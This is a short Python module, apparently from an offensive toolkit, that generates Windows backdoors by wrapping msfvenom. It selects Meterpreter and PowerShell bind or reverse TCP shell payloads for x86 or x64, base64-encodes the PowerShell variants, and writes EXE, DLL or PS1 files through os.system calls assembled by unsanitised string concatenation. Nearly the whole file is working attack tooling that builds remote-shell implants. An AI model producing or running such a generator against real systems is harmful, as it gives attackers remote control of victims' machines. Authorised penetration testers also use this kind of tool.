from lib.utils import cprint
import os

class gen(object):
	def __init__(self):
		self.exe_dll_payload = {
			'x86': {
				'bind': 'windows/meterpreter/bind_tcp',
				'reverse': 'windows/meterpreter/reverse_tcp'
			},
			'x64': {
				'bind': 'windows/x64/meterpreter/bind_tcp',
				'reverse': 'windows/x64/meterpreter/reverse_tcp'
			}
		}
		self.ps1_payload = {
			'x86': {
				'bind': 'windows/powershell_bind_tcp',
				'reverse': 'windows/powershell_reverse_tcp'

			},
			'x64': {
				'bind': 'windows/x64/powershell_bind_tcp',
				'reverse': 'windows/x64/powershell_reverse_tcp'
			}
		}

	def parse_args(self,data):
		args = ''
		for k,v in data.items():
			args += k + '=' + v + ' '
		return args

	def build_exe_dll(self,arch,ctype,args,fmt):
		args += '-f ' + fmt
		command = 'msfvenom -p ' + self.exe_dll_payload.get(arch).get(ctype) + ' ' + args + ' > tmp/' + arch + '.' + fmt
		cprint('Generating ' + arch + ' EXE/DLL Backdoor','info')
		os.system(command)
		cprint('Generated Successfully! Files saved at ' + os.path.abspath('./tmp'),'succ')

	def build_ps1(self,arch,ctype,ite,args,fmt):
		args += '-e cmd/powershell_base64 -i ' + ite
		if fmt == 'raw':
			command = 'msfvenom -p ' + self.ps1_payload.get(arch).get(ctype) + ' ' + args
		else:
			command = 'msfvenom -p ' + self.ps1_payload.get(arch).get(ctype) + ' ' + args + ' > tmp/' + arch + '.' + fmt
		cprint('Generating ' + arch + ' EXE/DLL Backdoor','info')
		os.system(command)
		cprint('Generated Successfully! Files saved at ' + os.path.abspath('./tmp') + ' or on Terminal','succ')